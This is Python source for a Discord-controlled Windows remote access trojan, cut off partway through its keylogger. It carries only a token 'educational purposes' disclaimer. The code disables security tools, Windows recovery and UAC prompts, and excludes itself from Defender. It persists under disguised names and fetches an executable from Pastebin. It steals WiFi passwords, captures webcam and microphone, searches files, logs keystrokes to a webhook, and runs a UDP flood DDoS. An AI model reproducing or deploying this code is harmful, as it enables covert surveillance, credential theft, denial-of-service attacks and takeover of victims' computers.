# ==============================================================================
#             COMPILE AND RUN THIS SCRIPT AT YOUR OWN RISK
# This script is for educational and demonstration purposes only.
# The author is not responsible for any misuse or damage caused by this code.
# ==============================================================================

import os
import sys
import time
import json
import uuid
import ctypes
import socket
import sqlite3
import random
import string
import shutil
import logging
import base64
import re
import threading
import asyncio
import subprocess
import requests
import winreg
import win32api
import win32con
import win32gui
import win32event
import winerror
import win32crypt
import win32clipboard
import discord
from discord.ext import commands
import pyautogui
import platform
import psutil
import mss
import mss.tools
import cv2
import numpy as np
from PIL import Image
from io import BytesIO
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import HKDF
from Crypto.Hash import SHA256
from pynput import keyboard
import zipfile
import tempfile
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

def load_config():
    """Loads configuration from config.json."""
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')
    
    if not os.path.exists(config_path):
        print("[CRITICAL ERROR] config.json not found!")
        print("Please create a config.json file with your settings.")
        # You can choose to exit or continue with hardcoded fallbacks if you want
        # return {} 
        
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        print(f"[CONFIG] Loaded configuration from {config_path}")
        return config
    except Exception as e:
        print(f"[CRITICAL ERROR] Failed to load config.json: {e}")
        return {}

CONFIG = load_config()

# --- KILL SWITCH ---
KILL_SWITCH_FILE = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32\\dvag")
def check_kill_switch():
    """Checks for the presence of the kill switch file and exits if it exists."""
    if os.path.exists(KILL_SWITCH_FILE):
        print("[KILL SWITCH] Detected. Terminating.")
        os._exit(0)
check_kill_switch()
# --- END OF KILL SWITCH ---

# --- CONFIGURATION/gobals ---
BASE_PATH = os.path.expanduser("~")

import json
import os

# 1. Get the path to config.json
if getattr(sys, 'frozen', False):
    # Running as compiled exe
    BASE_DIR = sys._MEIPASS
else:
    # Running as script
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

CONFIG_PATH = os.path.join(BASE_DIR, "config.json")

# 2. Load Config
try:
    with open(CONFIG_PATH, 'r') as f:
        CONFIG = json.load(f)
except FileNotFoundError:
    print("Error: config.json not found!")
    sys.exit(1)

# 3. Use the config in your code
bot_token = CONFIG.get("BOT_TOKEN")
owner_id = CONFIG.get("OWNER_USER_ID")
webhook = CONFIG.get("KEYLOGGER_WEBHOOK_URL")

# --- CHAT SYSTEM GLOBALS (FINAL WORKING VERSION) ---
chat_active = False
chat_to_victim_channel_id = None
chat_from_victim_channel_id = None

# --- LOGGING SETUP ---
log_file_path = os.path.join(os.environ['APPDATA'], 'client_debug.log')
logging.basicConfig(
    filename=log_file_path,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
print(f"Debug logging enabled. Log file at: {log_file_path}")

# --- UNIQUE CLIENT ID SETUP ---
def get_client_id():
    """Generates a unique client ID based on the PC hostname."""
    hostname = platform.node()
    encoded_id = base64.b64encode(hostname.encode('utf-8')).decode('utf-8')
    return f"client_{encoded_id}"
CLIENT_ID = get_client_id()
ID_FILE_PATH = os.path.join(os.environ['APPDATA'], f"{CLIENT_ID}.json")
CLIENT_GUILD_ID = None
CONTROL_PANEL_MESSAGE_ID = None

# --- HIDE CONSOLE WINDOW ---
if sys.platform == 'win32':
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# --- UAC SILENT ELEVATION SETUP ---
def set_uac_elevation():
    """Sets a registry entry to allow this executable to run with elevated permissions without showing a UAC prompt."""
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\AppCompatFlags\Layers"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, exe_path, 0, winreg.REG_SZ, '~ RUNASADMIN')
        winreg.CloseKey(key)
    except Exception:
        pass

# --- ADMIN STATUS CHECK ---
def is_admin():
    """Returns True if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ==============================================================================
# --- NEW STARTUP SECURITY AND EXCLUSION FUNCTIONS ---
# ==============================================================================

# --- HELPER FUNCTION TO KILL A PROCESS ---
def kill_process(process_name):
    """Attempts to kill all running instances of a given process name."""
    try:
        subprocess.run(['taskkill', '/F', '/IM', process_name], capture_output=True, check=False, creationflags=subprocess.CREATE_NO_WINDOW)
        print(f"[STARTUP SECURITY] Attempted to kill process: {process_name}")
    except Exception as e:
        print(f"[STARTUP SECURITY] Error killing {process_name}: {e}")

# --- STARTUP WINRE DISABLER ---
def startup_disable_winre():
    """Silently and forcefully disables WinRE via registry and file rename on startup."""
    print("[STARTUP SECURITY] Forcefully disabling WinRE...")
    try:
        key_path = r"SOFTWARE\Microsoft\Windows Recovery Environment"
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "RecoveryEnabled", 0, winreg.REG_DWORD, 0)
            print("[STARTUP SECURITY] WinRE registry updated successfully.")
        except FileNotFoundError:
            print("[STARTUP SECURITY] WinRE registry key not found. Skipping.")
        except Exception as e:
            print(f"[STARTUP SECURITY] Error updating WinRE registry: {e}")
        reagent_path = r"C:\Recovery\WindowsRE"
        if os.path.exists(reagent_path):
            winre_file = os.path.join(reagent_path, "winre.wim")
            backup_file = os.path.join(reagent_path, "winre.wim.bak")
            if os.path.exists(winre_file):
                try:
                    os.rename(winre_file, backup_file)
                    print(f"[STARTUP SECURITY] Renamed WinRE tool to '{backup_file}'.")
                except Exception as e:
                    print(f"[STARTUP SECURITY] Error renaming WinRE tool: {e}")
            else:
                print("[STARTUP SECURITY] WinRE tool not found, but registry was updated.")
        else:
            print("[STARTUP SECURITY] WinRE directory not found. WinRE is likely already disabled or non-standard.")
    except Exception as e:
        print(f"[STARTUP SECURITY] A critical error occurred during startup WinRE disable: {e}")

# --- WINDOWS DEFENDER EXCLUSION FUNCTIONS ---
def get_malware_path():
    """Gets the full path of the currently running malware executable."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return os.path.dirname(os.path.abspath(__file__))

def add_to_defender_exclusions():
    """Adds the malware's directory to Windows Defender exclusions using PowerShell."""
    try:
        malware_path = get_malware_path()
        if not malware_path:
            print("[DEFENDER] Could not determine malware path. Cannot add exclusion.")
            return False
        ps_command = f'Add-MpPreference -ExclusionPath "{malware_path}" -Force'
        result = subprocess.run(
            ['powershell.exe', '-Command', ps_command],
            capture_output=True, text=True, check=False, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if result.returncode == 0:
            print(f"[DEFENDER] Successfully added exclusion for path: {malware_path}")
            return True
        else:
            print(f"[DEFENDER] Failed to add exclusion. Error: {result.stderr.strip()}")
            return False
    except Exception as e:
        print(f"[DEFENDER] An error occurred while adding exclusion: {e}")
        return False

def check_exclusion_status():
    """Checks if the malware's path is in Windows Defender exclusions."""
    try:
        malware_path = get_malware_path()
        if not malware_path:
            return False
        ps_command = f'Get-MpPreference | Select-Object ExclusionPaths'
        result = subprocess.run(
            ['powershell.exe', '-Command', ps_command],
            capture_output=True, text=True, check=False,  creationflags=subprocess.CREATE_NO_WINDOW, timeout=15
        )
        if result.returncode == 0 and malware_path in result.stdout:
            print("[DEFENDER] Exclusion status confirmed. Path is still excluded.")
            return True
        else:
            print("[DEFENDER] WARNING: Exclusion not found! Path may be at risk.")
            return False
    except Exception as e:
        print(f"[DEFENDER] An error occurred while checking exclusion status: {e}")
        return False
    
# ==============================================================================
# --- SKIP SECURITY SWITCH (DEV MODE) ---
# ==============================================================================
SKIP_SECURITY_FILE = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "dvagdevmode")

def check_skip_security_switch():
    """
    Checks for the presence of the skip switch file.
    If it exists, sets a global flag to skip the secure_environment function.
    """
    global SKIP_SECURITY_LOCKDOWN
    if os.path.exists(SKIP_SECURITY_FILE):
        print("[SKIP SECURITY] Switch detected. Skipping aggressive lockdown on startup.")
        SKIP_SECURITY_LOCKDOWN = False
    else:
        # Default to True (enable lockdown) unless the switch is present
        SKIP_SECURITY_LOCKDOWN = True
# ==============================================================================
# --- END OF SKIP SECURITY SWITCH (DEV MODE) ---
# ==============================================================================

check_skip_security_switch()

# --- STARTUP SECURITY FUNCTION (UPDATED) ---
async def secure_environment():
    """Runs a series of commands at startup to lock down the system aggressively."""
    
    # --- CHECK SKIP SWITCH ---
    global SKIP_SECURITY_LOCKDOWN
    if not SKIP_SECURITY_LOCKDOWN:
        print("[STARTUP] Security lockdown skipped via switch.")
        return
    # --------------------------

    print("[STARTUP] Securing environment...")
    try:
        # --- Step 1: Terminate Running Security Processes ---
        print("[STARTUP SECURITY] Terminating known security processes...")
        kill_process("Taskmgr.exe")
        kill_process("regedit.exe")
        kill_process("cmd.exe")
        kill_process("powershell.exe")
        kill_process("msconfig.exe")

        # --- Step 2: Disable System Tools via Registry ---
        print("[STARTUP SECURITY] Applying registry-based lockdowns...")
        
        # Call these directly (synchronous functions)
        handle_disabletm(None)
        handle_disablecmd(None)
        handle_disableregedit(None)
        handle_disableuac(None)

        # --- Step 3: Forcefully Disable WinRE ---
        startup_disable_winre()

        # --- Step 4: Add Defender Exclusion ---
        print("[STARTUP SECURITY] Adding to Windows Defender exclusions...")
        add_to_defender_exclusions()

        print("[STARTUP] Environment secured. Security tools terminated, disabled, and exclusion added.")
    except Exception as e:
        print(f"[STARTUP] Error during security lockdown: {e}")

# --- SECURE AUTO-DOWNLOADER FUNCTION ---
def download_dependency():
    """Downloads nircmd.exe anonymously from Pastebin to System32 if it doesn't exist."""
    NIRCMD_URL = "https://pastebin.com/raw/D0KMa6KC"
    destination_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32\\nircmd.exe")
    if not NIRCMD_URL.startswith("http"):
        print("[AUTO-DOWNLOADER] Error: NIRCMD_URL is not a valid URL. Please configure it.")
        return
    if os.path.exists(destination_path):
        print("[AUTO-DOWNLOADER] nircmd.exe already exists. Skipping download.")
        return
    print("[AUTO-DOWNLOADER] nircmd.exe not found. Downloading anonymously...")
    try:
        response = requests.get(NIRCMD_URL, timeout=30)
        response.raise_for_status()
        with open(destination_path, 'wb') as f:
            f.write(response.content)
        print(f"[AUTO-DOWNLOADER] Success! nircmd.exe downloaded to {destination_path}")
    except requests.exceptions.RequestException as e:
        print(f"[AUTO-DOWNLOADER] Error: Failed to download nircmd.exe. {e}")
    except Exception as e:
        print(f"[AUTO-DOWNLOADER] An unexpected error occurred during download: {e}")

# --- C2 CHANNEL MANAGEMENT (FIXED FOR MULTI-USER) ---
async def setup_c2_channels(guild):
    """Creates C2 channels and a dedicated keylogger channel with its own webhook."""
    if os.path.exists(ID_FILE_PATH):
        print("ID file found, loading existing channel IDs.")
        with open(ID_FILE_PATH, 'r') as f:
            return json.load(f)
    print("ID file not found, creating new C2 channels...")
    try:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True, manage_channels=True),
        }
        category = await guild.create_category(name=CLIENT_ID, overwrites=overwrites, position=0, reason="C2 Client Setup")
        connection_channel = await category.create_text_channel("connection-status")
        file_channel = await category.create_text_channel("file-access")
        system_channel = await category.create_text_channel("system-access")
        media_channel = await category.create_text_channel("mic-webcam-access")
        task_channel = await category.create_text_channel("task-manager-access")
        keylogger_channel = await category.create_text_channel("keylogger", topic=f"Live keystroke logs for {CLIENT_ID}")
        keylogger_webhook = await keylogger_channel.create_webhook(name=f"Keylogger - {CLIENT_ID}")
        channel_ids = {
            "connection_channel_id": connection_channel.id, "file_channel_id": file_channel.id,
            "system_channel_id": system_channel.id, "media_channel_id": media_channel.id,
            "task_channel_id": task_channel.id, "keylogger_channel_id": keylogger_channel.id,
            "keylogger_webhook_url": keylogger_webhook.url
        }
        with open(ID_FILE_PATH, 'w') as f:
            json.dump(channel_ids, f)
        print("C2 channels and keylogger webhook created successfully.")
        return channel_ids
    except Exception as e:
        print(f"Failed to create C2 channels: {e}")
        return None

# --- ALL REAL SYSTEM FUNCTIONS ---
def disable_regedit():
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

def enable_regedit():
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableRegistryTools")
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return True
    except Exception:
        return False

def disable_cmd():
    try:
        key_path = r"SOFTWARE\Policies\Microsoft\Windows\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

def enable_cmd():
    try:
        key_path = r"SOFTWARE\Policies\Microsoft\Windows\System"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableCMD")
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return True
    except Exception:
        return False

def shutdown_pc(action="shutdown"):
    try:
        if action == "restart":
            command = "shutdown /r /t 5 /c \"System will restart in 5 seconds.\""
        else:
            command = "shutdown /s /t 5 /c \"System will shutdown in 5 seconds.\""
        subprocess.run(command, check=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception:
        return False

def disable_uac_prompts():
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Failed to disable UAC prompts: {e}")
        return False

def enable_uac_prompts():
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 5)
        winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Failed to enable UAC prompts: {e}")
        return False

def add_runonce_persistence():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
        value_name = "WindowsSystemUpdate"
        hkey = winreg.HKEY_CURRENT_USER
        access = winreg.KEY_SET_VALUE
        reg_type = winreg.REG_SZ
        key = winreg.OpenKey(hkey, key_path, 0, access)
        winreg.SetValueEx(key, value_name, 0, reg_type, str(exe_path))
        winreg.CloseKey(key)
        return "Success"
    except Exception as e:
        return f"A critical error occurred: {e}"

def remove_runonce_persistence():
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
        value_name = "WindowsSystemUpdate"
        hkey = winreg.HKEY_CURRENT_USER
        access = winreg.KEY_SET_VALUE
        key = winreg.OpenKey(hkey, key_path, 0, access)
        winreg.DeleteValue(key, value_name)
        winreg.CloseKey(key)
        return "Success"
    except FileNotFoundError:
        return "Success"
    except Exception as e:
        return f"A critical error occurred: {e}"

def disable_winre():
    try:
        result = subprocess.run(['reagentc.exe', '/disable'], capture_output=True, text=True, timeout=30, encoding='cp850')
        if result.returncode == 0:
            return "Success"
        else:
            error_info = (
                f"Command failed with return code: {result.returncode}\n"
                f"Stdout: {result.stdout.strip()}\n"
                f"Stderr: {result.stderr.strip()}"
            )
            return error_info
    except subprocess.TimeoutExpired:
        return "Command timed out."
    except FileNotFoundError:
        return "reagentc.exe not found."
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"

def enable_winre():
    try:
        result = subprocess.run(['reagentc.exe', '/enable'], capture_output=True, text=True, timeout=30, encoding='cp850')
        if result.returncode == 0:
            return "Success"
        else:
            error_info = (
                f"Command failed with return code: {result.returncode}\n"
                f"Stdout: {result.stdout.strip()}\n"
                f"Stderr: {result.stderr.strip()}"
            )
            return error_info
    except subprocess.TimeoutExpired:
        return "Command timed out."
    except FileNotFoundError:
        return "reagentc.exe not found."
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"

# --- UPDATED FORCED WINRE HANDLERS ---
import winreg
import os
import ctypes
FILE_ATTRIBUTE_NORMAL = 0x80
FILE_ATTRIBUTE_HIDDEN = 0x2
FILE_ATTRIBUTE_SYSTEM = 0x4
def set_file_attributes(filepath, attributes):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(filepath, attributes)
        return True
    except Exception as e:
        print(f"Error setting file attributes for {filepath}: {e}")
        return False

async def force_disable_winre(ctx):
    """Forcibly disables WinRE on Home editions by editing the registry and renaming the file."""
    await ctx.send("üîß Attempting to force disable WinRE...")
    try:
        key_path = r"SOFTWARE\Microsoft\Windows Recovery Environment"
        await ctx.send("üîß Step 1: Editing registry to disable WinRE...")
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "RecoveryEnabled", 0, winreg.REG_DWORD, 0)
        await ctx.send("‚úÖ Registry updated successfully.")
        reagent_path = r"C:\Recovery\WindowsRE"
        await ctx.send(f"üîß Step 2: Checking for WinRE directory at '{reagent_path}'...")
        if os.path.exists(reagent_path):
            await ctx.send("‚úÖ Directory found. Proceeding with file rename...")
            winre_file = os.path.join(reagent_path, "winre.wim")
            backup_file = os.path.join(reagent_path, "winre.wim.bak")
            if os.path.exists(winre_file):
                await ctx.send("üîß Unhiding file...")
                set_file_attributes(winre_file, FILE_ATTRIBUTE_NORMAL)
                await ctx.send(f"üîß Renaming '{winre_file}' to '{backup_file}'...")
                os.rename(winre_file, backup_file)
                await ctx.send("‚úÖ **WinRE has been forcefully disabled.** A restart may be required to take full effect.")
            else:
                await ctx.send(f"‚ö†Ô∏è WinRE image file '{winre_file}' was not found inside the directory. Registry was still updated.")
        else:
            await ctx.send(f"‚ùå **CRITICAL:** The WinRE directory '{reagent_path}' does not exist on this machine.")
            await ctx.send("üí° This is common on some laptop configurations. The registry has been disabled, but there is no tool to rename.")
            await ctx.send("‚úÖ **WinRE has been effectively disabled via the registry.**")
    except Exception as e:
        await ctx.send(f"‚ùå **Failed to force disable WinRE.**\n**Reason:** `{str(e)}`")

async def force_enable_winre(ctx):
    """Re-enables WinRE by reversing the force_disable process."""
    await ctx.send("üîß Attempting to force enable WinRE...")
    try:
        await ctx.send("üîß Step 1: Locating and restoring WinRE image file...")
        reagent_path = r"C:\Recovery\WindowsRE"
        backup_file = os.path.join(reagent_path, "winre.wim.bak")
        winre_file = os.path.join(reagent_path, "winre.wim")
        if os.path.exists(backup_file):
            await ctx.send(f"üîß Renaming '{backup_file}' back to '{winre_file}'...")
            os.rename(backup_file, winre_file)
            await ctx.send("üîß Re-hiding file...")
            set_file_attributes(winre_file, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
            await ctx.send("‚úÖ WinRE image file restored and re-hidden.")
        else:
            await ctx.send(f"‚ö†Ô∏è Backup WinRE file not found at '{backup_file}'. Cannot restore tool.")
        await ctx.send("üîß Step 2: Editing registry to enable WinRE...")
        key_path = r"SOFTWARE\Microsoft\Windows Recovery Environment"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "RecoveryEnabled", 0, winreg.REG_DWORD, 1)
        await ctx.send("‚úÖ Registry updated successfully.")
        await ctx.send("‚úÖ **WinRE has been forcefully re-enabled.** A restart may be required to take full effect.")
    except Exception as e:
        await ctx.send(f"‚ùå **Failed to force enable WinRE.**\n**Reason:** `{str(e)}`")

# --- ALL OTHER FEATURES (STEALERS, MEDIA, PERSISTENCE, ETC.) ---
def capture_webcam_snapshot():
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if not ret: return None, "Failed to capture frame from webcam."
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(temp_dir, f"webcam_{timestamp}.png")
        cv2.imwrite(filename, frame)
        return filename, None
    except ImportError: return None, "OpenCV library is not installed. Cannot capture webcam."
    except Exception as e: return None, f"An error occurred during webcam capture: {e}"

def capture_microphone_clip(duration_seconds=5):
    try:
        import pyaudio
        import wave
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration_seconds)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(temp_dir, f"mic_{timestamp}.wav")
        wf = wave.open(filename, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        return filename, None
    except ImportError: return None, "PyAudio library is not installed. Cannot capture microphone."
    except Exception as e: return None, f"An error occurred during microphone capture: {e}"

def set_wallpaper(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        return True
    except Exception as e:
        print(f"Failed to set wallpaper: {e}")
        return False

def download_wallpaper(url):
    try:
        response = requests.get(url, timeout=10, verify=False)
        response.raise_for_status()
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(temp_dir, f"wallpaper_{timestamp}.jpg")
        with open(filename, 'wb') as f:
            f.write(response.content)
        return filename, None
    except Exception as e:
        return None, f"Failed to download wallpaper: {e}"

def get_wifi_passwords():
    try:
        command = "netsh wlan show profile"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        stdout, stderr = process.communicate()
        if stderr: return f"Failed to get WiFi profiles.\nError: {stderr}"
        profiles = []
        for line in stdout.split('\n'):
            if "All User Profile" in line: profiles.append(line.split(":")[1].strip())
        if not profiles: return "No saved WiFi profiles found."
        results = ["--- Recovered WiFi Passwords ---"]
        for profile in profiles:
            try:
                profile_command = f'netsh wlan show profile name="{profile}" key=clear'
                profile_process = subprocess.Popen(profile_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                p_stdout, p_stderr = profile_process.communicate()
                if p_stderr:
                    results.append(f"SSID: {profile}\nError retrieving key: {p_stderr.strip()}")
                    results.append("-" * 20)
                    continue
                key_content = "Not found"
                for p_line in p_stdout.split('\n'):
                    if "Key Content" in p_line:
                        key_content = p_line.split(":")[1].strip()
                        break
                results.append(f"SSID: {profile}\nPassword: {key_content}")
                results.append("-" * 20)
            except Exception as e:
                results.append(f"SSID: {profile}\nAn error occurred: {e}")
                results.append("-" * 20)
        return "\n".join(results)
    except Exception as e:
        return f"An unexpected error occurred: {e}"

def get_running_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                processes.append(f"PID: {proc.info['pid']:<6} | Name: {proc.info['name']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): continue
        return "\n".join(processes)
    except Exception as e:
        return f"Failed to list processes: {e}"

def kill_process_by_pid(pid):
    try:
        pid = int(pid)
        proc = psutil.Process(pid)
        proc.kill()
        return f"Successfully killed process with PID {pid}."
    except psutil.NoSuchProcess: return f"No process found with PID {pid}."
    except Exception as e: return f"Failed to kill PID {pid}: {e}"

def kill_process_by_name(name):
    try:
        killed_count = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == name.lower():
                try:
                    proc.kill()
                    killed_count += 1
                except (psutil.NoSuchProcess, psutil.AccessDenied): continue
        if killed_count > 0: return f"Successfully killed {killed_count} instance(s) of '{name}'."
        else: return f"No running processes found with the name '{name}'."
    except Exception as e: return f"Failed to kill process by name: {e}"

def add_startup_persistence():
    try:
        if getattr(sys, 'frozen', False): exe_path = sys.executable
        else: exe_path = os.path.abspath(__file__)
        startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        shortcut_path = os.path.join(startup_folder, "system_lag_fix.exe")
        shutil.copy2(exe_path, shortcut_path)
        return "Success"
    except Exception as e: return f"An error occurred: {e}"

def remove_startup_persistence():
    try:
        startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        shortcut_path = os.path.join(startup_folder, "system_lag_fix.exe")
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)
        return "Success"
    except Exception as e: return f"An error occurred: {e}"

def search_files(base_path, search_term):
    try:
        base_path = resolve_path(base_path)
        if not base_path: return "Error: Invalid search path."
        results = []
        for root, dirs, files in os.walk(base_path):
            for file in files:
                if search_term.lower() in file.lower():
                    full_path = os.path.join(root, file)
                    results.append(f"FILE: {full_path}")
        for root, dirs, files in os.walk(base_path):
            for file in files:
                if file.lower().endswith(('.txt', '.log', '.json', '.xml', '.csv', '.py', '.bat', '.ps1')):
                    try:
                        full_path = os.path.join(root, file)
                        with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                            if search_term.lower() in f.read().lower():
                                results.append(f"CONTENT: {full_path}")
                    except Exception: continue
        return "\n".join(results) if results else f"No files found matching '{search_term}' in '{base_path}'."
    except Exception as e: return f"An error occurred during search: {e}"

ddos_running = False
def udp_flood(ip, port, packet_size, duration):
    global ddos_running
    ddos_running = True
    duration = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(packet_size)
    while time.time() < duration and ddos_running:
        try:
            port_to_send = random.randint(1, 65535) if port == 0 else port
            sock.sendto(bytes_to_send, (ip, port_to_send))
        except Exception: pass
    sock.close()
    ddos_running = False

def start_ddos_attack(ip, port, duration, threads, packet_size):
    global ddos_running
    if ddos_running: return "An attack is already running. Stop it first with `!ddos stop`."
    try: port = int(port); duration = int(duration); threads = int(threads); packet_size = int(packet_size)
    except ValueError: return "Invalid parameters. All must be integers."
    if not (1 <= threads <= 50): return "Thread count must be between 1 and 50."
    if not (1 <= duration <= 300): return "Duration must be between 1 and 300 seconds."
    if not (1 <= packet_size <= 65500): return "Packet size must be between 1 and 65500 bytes."
    for _ in range(threads):
        thread = threading.Thread(target=udp_flood, args=(ip, port, packet_size, duration))
        thread.daemon = True
        thread.start()
    return f"Attack started on {ip}:{port} for {duration} seconds with {threads} threads."

def stop_ddos_attack():
    global ddos_running
    if not ddos_running: return "No active attack to stop."
    ddos_running = False
    return "Attack stop command sent. Threads will terminate shortly."

def resolve_path(path):
    if ".." in path: return None
    full_path = os.path.abspath(os.path.join(BASE_PATH, path))
    if not full_path.startswith(os.path.abspath(BASE_PATH)): return None
    return full_path

def show_popup(title, message):
    try:
        command = f'nircmd.exe messagebox q "{title}" "{message}"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
        if result.returncode == 0: return True
        else:
            error_message = result.stderr.strip()
            print(f"[ERROR] nircmd failed! Return Code: {result.returncode}")
            print(f"[ERROR] Stderr: {error_message}")
            print(f"[ERROR] Stdout: {result.stdout.strip()}")
            return False
    except FileNotFoundError:
        print("[ERROR] nircmd.exe not found. Cannot show popup.")
        return False
    except Exception as e:
        print(f"[ERROR] show_popup failed: {e}")
        return False

user32 = ctypes.windll.user32
VK_VOLUME_UP = 0xAF
VK_VOLUME_DOWN = 0xAE
VK_VOLUME_MUTE = 0xAD
KEYEVENTF_KEYUP = 0x2
def volume_up():
    user32.keybd_event(VK_VOLUME_UP, 0, 0, 0)
    user32.keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0)
def volume_down():
    user32.keybd_event(VK_VOLUME_DOWN, 0, 0, 0)
    user32.keybd_event(VK_VOLUME_DOWN, 0, KEYEVENTF_KEYUP, 0)
def volume_mute():
    user32.keybd_event(VK_VOLUME_MUTE, 0, 0, 0)
    user32.keybd_event(VK_VOLUME_MUTE, 0, KEYEVENTF_KEYUP, 0)

# --- KEYLOGGER SETUP ---
log_file = os.path.join(os.environ['APPDATA'], 'system_log.txt')
keystroke_buffer = []
buffer_size = 50
KEYLOGGER_WEBHOOK_URL = None
def on_press(key):
    global keystroke_buffer, KEYLOGGER_WEBHOOK_URL
    if not KEYLOGGER_WEBHOOK_URL: return
    try: keystroke = f'{key.char}'
    except AttributeError:
        special_keys = {
